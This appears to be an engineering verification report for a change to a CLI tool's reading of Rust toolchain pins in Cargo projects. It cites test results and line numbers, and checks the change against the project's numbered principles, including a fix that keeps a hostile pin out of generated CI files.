- **Nothing broke.** `test_survey_cargo_toolchain`, `test_adopt_cargo_toolchain`, `test_survey_cargo`,
  `test_survey_cargo_workspace`, `test_survey`, `test_adopt`: green. `test_changelog`: the one environmental tag
  failure only. `scripts/verify --lint-only`, `--typecheck-only`, `scripts/check-structure.py`: green. The full
  `make -f delivery/Makefile verify` was not run (it runs after demo acceptance).
- **T012 is still accurate in substance, stale in four citations.** The dangling-link test is now at
  `tests/test_survey_cargo_toolchain.py:163` (was 129), the BOM subtest at `:96` (was 61), the `lexists` decision at
  `cargo.py:94` (was 88); and R18's invalid-UTF-8 `rust-toolchain` now records `""`, not `1.85�` (T011's check) —
  still not rustup's answer, which is the root's pin. Whoever closes T012 reads those numbers here.

Each level, what the diff proves and what it does not:

- **Domain — the pin reading** (`cargo.py:55-100`). Proves TG1-TG6 as worded and D23's clause in TG5: the walk to the
  root and never above (test lines 149, 156, 169), the legacy file first (143, 146), one line versus TOML (123-140,
  D22), every TG4 shape verbatim (38), the unusable pins (86, 103), `rust-version` ignored (109), a channel that is
  not a toolchain name recorded empty (47). Does not prove rustup's reading where a file cannot be read or carries a
  BOM (T012, pending D24).
- **Use case — survey / adopt / adopt --refresh.** Proves the survey answer, the adopted record (190), TG8's refresh
  (221), the disagreement for confirmed and overridden (230), the second refresh's no-op (241), and that a hostile
  channel is recorded as `""` through `adopt --yes` (63). Nothing further owed.
- **Delivery adapter — the pages and `project.json`.** Proves the survey page (190, 196), the GitLab comment, the
  adoption page and `/ground`'s Platform line carry `rust 1.85`, and the GitHub workflow names no Rust
  (`tests/test_adopt_cargo_toolchain.py:31-49`); that a hostile channel reaches none of the survey page, the GitLab
  job or `adoption.md` (test line 63). Does not assert `ground.md` under a hostile channel (T015, LOW).
- **Screen — none.** The slice is a CLI's survey.
- **Published contract.** `project.json`'s toolchain shape is unchanged (test lines 38-45, 190). The fragment names
  the non-name exclusion (`changelog.d/rust-cargo-adopt.md:27-29`) and keeps the pin out of *What stays out* (`:31`).
  TG9's hand-over is the version string only, and its "no Rust step" half is now proved
  (`tests/test_adopt_cargo_toolchain.py:31-34`).

Constitution principles the diff touches:

- **I — what a project was given keeps meaning what it meant.** Satisfied: the Cargo row is unreleased (in
  `changelog.d/`, not `CHANGELOG.md`); `changelog.d/rust-cargo-adopt.md:1` stays `MINOR` and `:22` says experimental;
  `VERSION` is `1.4.0.dev0`; the Catch-up note is written (`:47`); other ecosystems keep their answers — the walk and
  the D23 check are called by the Cargo row alone (`cargo.py:118`; test line 174).
- **II — re-running is safe.** Satisfied: a second `adopt --refresh` over an unchanged pin changes nothing
  (`tests/test_survey_cargo_toolchain.py:241`); the walk stops at the root (test line 169).
- **III — simplicity.** Satisfied: the D23 fix is one constant and one conditional (`cargo.py:84, 97`), no new module
  or field.
- **V (as it holds today) — tests at the boundary, fakes in the test tree, no mocking framework.** Satisfied: the new
  tests enter at `survey` and `slipwai adopt --yes` (`tests/test_survey_cargo_toolchain.py:24, 63`;
  `tests/test_adopt_cargo_toolchain.py:22-28`); no mock imported.
- **VIII — what a repository records is a contract.** Satisfied: no key added; `toolchain.version` stays a string,
  now narrower in what it can hold (test lines 38-45, 47).
- **IX — security.** Satisfied for this slice's route: a tree's toolchain file can no longer write a line into a
  generated CI file or page (`cargo.py:97`; test line 63). The same class for other ecosystems' pins
  (`project/adopted_ci.py:63`, code that was here) remains handed back to the delegating session (T011).
- **XIV — agent-generated change meets the same bar.** Satisfied for the code: each fix is its own commit with its
  tests (1ca5cef carries `cargo.py`, the tests and the fragment together). The amendment of TG5 (`spec.md:238`) is an
  acceptance criterion an agent wrote; D23 records it as decided by `drive-slice` and "returned to the delegating
  session for review", so it stands on that review: the delegating session confirms the owner (or the product
  owner's delegate) accepted D23 before the PR is merged. T012's D24 is held to the same, and is why T012 is open.
- **VII** — no refusal added; an unusable pin is empty, never an error (D21). **XIII, XV** — targets not in force; the
  new suites run in seconds. **IV, VI, X, XI, XII** — not touched (no port, no third-party adapter, no branch policy,
  no pipeline route, no build or deploy artifact).
